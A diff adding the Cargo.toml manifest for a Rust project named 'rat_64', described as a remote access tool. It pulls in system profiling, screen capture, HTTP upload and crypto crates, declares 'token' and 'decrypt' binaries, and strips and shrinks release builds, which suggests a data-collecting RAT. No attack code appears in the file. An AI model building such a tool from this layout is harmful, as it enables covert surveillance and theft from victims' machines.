@@ -1,0 +1,60 @@
+# 最適化された Cargo.toml
+# より軽量で依存関係を最小化
+
+[package]
+name = "rat_64"
+version = "0.1.0"
+edition = "2021"
+default-run = "rat_64"
+authors = ["Emanon01001"]
+description = "Remote Access Tool with AES-256 encryption"
+
+[lib]
+name = "rat_64"
+path = "src/main.rs"
+
+[[bin]]
+name = "decrypt"
+path = "src/bin/decrypt.rs"
+
+[[bin]]
+name = "show_key"
+path = "src/bin/show_key.rs"
+
+[[bin]]
+name = "token"
+path = "src/bin/token.rs"
+
+[profile.release]
+# 最適化設定
+opt-level = "z"          # サイズ最適化
+lto = true               # Link Time Optimization
+panic = "abort"          # パニック時即座に終了
+codegen-units = 1        # 単一コード生成ユニット
+strip = true             # デバッグシンボルを削除
+
+[dependencies]
+# 必須の依存関係のみ
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+sysinfo = "0.37.0"
+whoami = "1.6.1"
+rand = "0.9.2"
+aes-gcm = "0.10"
+rmp-serde = "1.1"
+reqwest = { version = "0.12.23", features = ["blocking", "multipart"], default-features = false, optional = true }
+base64 = "0.22.1"
+local_ipaddress = "0.1"
+scrap = "0.5"
+image = { version = "0.25.8", default-features = false, features = ["png"] }
+os_info = "3.12.0"
+regex = "1.11.2"
+
+[target.'cfg(windows)'.dependencies]
+wmi = "0.17.2"
+
+[features]
+default = ["upload"]
+upload = ["reqwest"]      # アップロード機能（オプション）
+webcam = []               # Webカメラ機能（将来用）
+minimal = []              # 最小構成
